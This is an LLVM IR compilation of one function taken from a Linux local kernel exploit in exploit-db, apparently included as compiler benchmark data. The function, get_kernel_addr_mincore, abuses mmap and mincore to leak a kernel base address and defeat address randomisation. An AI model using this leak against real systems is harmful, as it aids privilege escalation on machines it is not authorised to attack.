; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_47170.c_get_kernel_addr_mincore.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_47170.c_get_kernel_addr_mincore.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [33 x i8] c"[.] trying mincore info leak...\0A\00", align 1
@PROT_NONE = common dso_local global i32 0, align 4
@MAP_SHARED = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@MAP_HUGETLB = common dso_local global i32 0, align 4
@MAP_NORESERVE = common dso_local global i32 0, align 4
@MAP_FAILED = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [12 x i8] c"[-] mmap()\0A\00", align 1
@.str.2 = private unnamed_addr constant [15 x i8] c"[-] mincore()\0A\00", align 1
@.str.3 = private unnamed_addr constant [14 x i8] c"[-] munmap()\0A\00", align 1
@.str.4 = private unnamed_addr constant [48 x i8] c"[-] kernel base not found in mincore info leak\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i64 @get_kernel_addr_mincore() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = alloca i64, align 8
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = call i32 (...) @getpagesize()
  %10 = sext i32 %9 to i64
  %11 = udiv i64 %10, 1
  %12 = call i8* @llvm.stacksave()
  store i8* %12, i8** %2, align 8
  %13 = alloca i8, i64 %11, align 16
  store i64 %11, i64* %3, align 8
  store i64 20000000, i64* %4, align 8
  store i64 0, i64* %5, align 8
  %14 = call i32 @dprintf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str, i64 0, i64 0))
  %15 = load i32, i32* @PROT_NONE, align 4
  %16 = load i32, i32* @MAP_SHARED, align 4
  %17 = load i32, i32* @MAP_ANONYMOUS, align 4
  %18 = or i32 %16, %17
  %19 = load i32, i32* @MAP_HUGETLB, align 4
  %20 = or i32 %18, %19
  %21 = load i32, i32* @MAP_NORESERVE, align 4
  %22 = or i32 %20, %21
  %23 = call i64 @mmap(i8* inttoptr (i64 1711276032 to i8*), i32 0, i32 %15, i32 %22, i32 -1, i32 0)
  %24 = load i64, i64* @MAP_FAILED, align 8
  %25 = icmp eq i64 %23, %24
  br i1 %25, label %26, label %28

26:                                               ; preds = %0
  %27 = call i32 @dprintf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0))
  store i64 0, i64* %1, align 8
  store i32 1, i32* %6, align 4
  br label %79

28:                                               ; preds = %0
  store i32 0, i32* %7, align 4
  br label %29

29:                                               ; preds = %69, %28
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = load i64, i64* %4, align 8
  %33 = icmp ule i64 %31, %32
  br i1 %33, label %34, label %72

34:                                               ; preds = %29
  %35 = call i64 @mincore(i8* inttoptr (i64 2248146944 to i8*), i32 16777216, i8* %13)
  %36 = icmp ne i64 %35, 0
  br i1 %36, label %37, label %39

37:                                               ; preds = %34
  %38 = call i32 @dprintf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.2, i64 0, i64 0))
  store i64 0, i64* %1, align 8
  store i32 1, i32* %6, align 4
  br label %79

39:                                               ; preds = %34
  store i32 0, i32* %8, align 4
  br label %40

40:                                               ; preds = %65, %39
  %41 = load i32, i32* %8, align 4
  %42 = sext i32 %41 to i64
  %43 = call i32 (...) @getpagesize()
  %44 = sext i32 %43 to i64
  %45 = udiv i64 %44, 1
  %46 = icmp ult i64 %42, %45
  br i1 %46, label %47, label %68

47:                                               ; preds = %40
  %48 = load i32, i32* %8, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %13, i64 %49
  %51 = bitcast i8* %50 to i64*
  %52 = load i64, i64* %51, align 1
  store i64 %52, i64* %5, align 8
  %53 = load i64, i64* %5, align 8
  %54 = icmp ugt i64 %53, -4294967296
  br i1 %54, label %55, label %64

55:                                               ; preds = %47
  %56 = load i64, i64* %5, align 8
  %57 = and i64 %56, -16777216
  store i64 %57, i64* %5, align 8
  %58 = call i64 @munmap(i8* inttoptr (i64 1711276032 to i8*), i32 0)
  %59 = icmp ne i64 %58, 0
  br i1 %59, label %60, label %62

60:                                               ; preds = %55
  %61 = call i32 @dprintf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.3, i64 0, i64 0))
  br label %62

62:                                               ; preds = %60, %55
  %63 = load i64, i64* %5, align 8
  store i64 %63, i64* %1, align 8
  store i32 1, i32* %6, align 4
  br label %79

64:                                               ; preds = %47
  br label %65

65:                                               ; preds = %64
  %66 = load i32, i32* %8, align 4
  %67 = add nsw i32 %66, 1
  store i32 %67, i32* %8, align 4
  br label %40

68:                                               ; preds = %40
  br label %69

69:                                               ; preds = %68
  %70 = load i32, i32* %7, align 4
  %71 = add nsw i32 %70, 1
  store i32 %71, i32* %7, align 4
  br label %29

72:                                               ; preds = %29
  %73 = call i64 @munmap(i8* inttoptr (i64 1711276032 to i8*), i32 0)
  %74 = icmp ne i64 %73, 0
  br i1 %74, label %75, label %77

75:                                               ; preds = %72
  %76 = call i32 @dprintf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.3, i64 0, i64 0))
  br label %77

77:                                               ; preds = %75, %72
  %78 = call i32 @dprintf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.4, i64 0, i64 0))
  store i64 0, i64* %1, align 8
  store i32 1, i32* %6, align 4
  br label %79

79:                                               ; preds = %77, %62, %37, %26
  %80 = load i8*, i8** %2, align 8
  call void @llvm.stackrestore(i8* %80)
  %81 = load i64, i64* %1, align 8
  ret i64 %81
}

declare dso_local i32 @getpagesize(...) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare dso_local i32 @dprintf(i8*) #1

declare dso_local i64 @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i64 @mincore(i8*, i32, i8*) #1

declare dso_local i64 @munmap(i8*, i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
